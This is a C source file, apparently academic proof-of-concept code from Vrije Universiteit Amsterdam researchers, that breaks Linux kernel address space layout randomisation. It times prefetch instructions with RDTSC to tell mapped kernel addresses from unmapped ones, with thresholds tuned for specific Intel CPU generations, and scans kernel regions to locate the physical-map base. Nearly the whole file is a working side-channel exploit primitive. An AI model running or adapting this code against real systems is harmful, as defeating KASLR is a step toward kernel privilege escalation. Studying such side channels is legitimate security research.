/*
 * Friday, October 27th 2023
 *
 * Sander Wiebing - s.j.wiebing@vu.nl
 * Alvise de Faveri Tron - a.de.faveri.tron@vu.nl
 * Herbert Bos - herbertb@cs.vu.nl
 * Cristiano Giuffrida - giuffrida@cs.vu.nl
 *
 * Vrije Universiteit Amsterdam - Amsterdam, The Netherlands
 *
 */

#include <sys/mman.h>
#include <stdint.h>
#include <stdlib.h>
#include <stdio.h>
#include <unistd.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <time.h>
#include <string.h>
#include <assert.h>
#include <sched.h>


#define PHYS_MAP_START 0xffff800000000000
#define PHYS_MAP_END   0xffffc87fffffffff
#define PHYS_ALIGNMENT 1 << 30 // 1 GB

#define TEXT_START 0xffffffff80000000
#define TEXT_END   0xffffffffc0000000
#define TEXT_ALIGNMENT (1 << 21) // 2 MB

#if defined(INTEL_10_GEN)
    #define EXTRA_THRESHOLD  5
    #define THRESHOLD_MAPPED 8

#elif defined(INTEL_13_GEN)
    #define EXTRA_THRESHOLD  1
    #define THRESHOLD_MAPPED 6

#else
    #error "Not supported micro-architecture"
    // silence undefined errors
    #define EXTRA_THRESHOLD 0
    #define THRESHOLD_MAPPED 0
#endif

uint64_t overhead;
uint64_t threshold;

__always_inline static void prefetch(uint8_t * addr)
{
	asm volatile (
        "xor %%rax, %%rax\n\t"
		"CPUID\n\t"
        "prefetcht0 (%0)\n\t"
        "xor %%rax, %%rax\n\t"
		"CPUID\n\t"
		:
		: "r" (addr)
		: "%rax", "%rbx", "%rcx", "%rdx"
	);
}



__always_inline static uint64_t time_prefetch(uint8_t * addr)
{
	unsigned start_low, start_high, end_low, end_high;
	uint64_t start, end, duration;

	asm volatile (
        "xor %%rax, %%rax\n\t"
		"CPUID\n\t"
		"RDTSC\n\t"
		"mov %%edx, %0\n\t"
		"mov %%eax, %1\n\t"
        "prefetcht0 (%4)\n\t"
		"RDTSCP\n\t"
		"mov %%edx, %2\n\t"
		"mov %%eax, %3\n\t"
        "xor %%rax, %%rax\n\t"
		"CPUID\n\t"
		: "=r" (start_high), "=r" (start_low), "=r" (end_high), "=r" (end_low)
		: "r" (addr)
		: "%rax", "%rbx", "%rcx", "%rdx"
	);

	start = ((uint64_t)start_high << 32) | (uint64_t)start_low;
	end = ((uint64_t)end_high << 32) | (uint64_t)end_low;
	duration = end - start;

	return duration;
}

static uint64_t time_prefetch_overhead()
{
	unsigned start_low, start_high, end_low, end_high;
	uint64_t start, end, duration;

	asm volatile (
        "xor %%rax, %%rax\n\t"
		"CPUID\n\t"
		"RDTSC\n\t"
		"mov %%edx, %0\n\t"
		"mov %%eax, %1\n\t"
        // "prefetcht0 (%4)\n\t"
		"RDTSCP\n\t"
		"mov %%edx, %2\n\t"
		"mov %%eax, %3\n\t"
        "xor %%rax, %%rax\n\t"
		"CPUID\n\t"
		: "=r" (start_high), "=r" (start_low), "=r" (end_high), "=r" (end_low)
		: "r" (0)
		: "%rax", "%rbx", "%rcx", "%rdx"
	);

	start = ((uint64_t)start_high << 32) | (uint64_t)start_low;
	end = ((uint64_t)end_high << 32) | (uint64_t)end_low;
	duration = end - start;

	return duration;
}

__always_inline static void evict_negative_cache() {


    for (size_t i = 0; i < 8; i++)
    {
        uint64_t addr =  0xffffffff + (rand() & 0xffffffff);
        asm volatile("prefetcht0 (%0)"
                :
                : "r" (addr));
    }

}

static uint8_t address_is_mapped(uint8_t * addr) {
    size_t time;

    for (size_t i = 0; i < 10; i++)
    {
        asm volatile("mfence\n");

        prefetch(addr);

        evict_negative_cache();

        time = time_prefetch(addr);

        if (time > (threshold + overhead)) {
            return 0;
        }
    }

    printf(" > %p %4ld %4ld\n", addr, time, (time - overhead));

    return 1;

}

// ------------------------------------------------------------------------
// Find the section start

uint64_t find_section_start(uint64_t start, uint64_t end, uint64_t alignment){


    uint64_t kern_address;
    uint8_t is_mapped;

    for (kern_address = start; kern_address < end; kern_address += alignment)
    {
        is_mapped = address_is_mapped((uint8_t *) kern_address);
        if (is_mapped) {
            return kern_address;
        }

    }
    printf("Finding section start failed!\n");
    return 0;

}

// ------------------------------------------------------------------------
// Initialize the overhead

#define ITERATIONS 100000

void initialize_kaslr_prefetch() {

    uint64_t time;
    uint64_t avg_overhead = 0, avg_mapped = 0, avg_not_mapped = 0;
    uint64_t min_mapped = 999999, min_not_mapped = 999999;
    overhead = 999999;

    for (size_t i = 0; i < ITERATIONS; i++)
    {
        time = time_prefetch_overhead();
        avg_overhead += time;

        if (time < overhead) {
            overhead = time;
        }
    }

    avg_overhead = avg_overhead / ITERATIONS;

    char * test_p;

    for (size_t i = 0; i < ITERATIONS; i++)
    {
        *(volatile char *) &test_p;

        asm volatile("mfence\n");

        time = time_prefetch((uint8_t *)test_p);

        avg_mapped += time;
        if (time < min_mapped) {
            min_mapped = time;
        }
    }

    avg_mapped = avg_mapped / ITERATIONS;


    for (size_t i = 0; i < ITERATIONS; i++)
    {
        evict_negative_cache();

        asm volatile("mfence\n");

        time = time_prefetch((uint8_t *)0xffff800000000000);

        avg_not_mapped += time;
        if (time < min_not_mapped) {
            min_not_mapped = time;
        }
    }

    avg_not_mapped = avg_not_mapped / ITERATIONS;

    uint64_t window = (avg_not_mapped) <= min_mapped ? 0 : ((avg_not_mapped - min_mapped) / 3);

    threshold = min_mapped - overhead + window + EXTRA_THRESHOLD;

#ifdef VERBOSE
    printf("%15s: Min: %lu Avg: %lu\n", "Overhead", overhead, avg_overhead);
    printf("%15s: Min: %lu Avg: %lu\n", "Mapped", min_mapped, avg_mapped);
    printf("%15s: Min: %lu Avg: %lu\n", "Not Mapped", min_not_mapped, avg_not_mapped);
#endif


    printf("Timing overhead: %ld Threshold: %ld\n", overhead, threshold);


}

uint64_t find_phys_map_start() {
    initialize_kaslr_prefetch();
    return find_section_start(PHYS_MAP_START, PHYS_MAP_END, PHYS_ALIGNMENT);
}
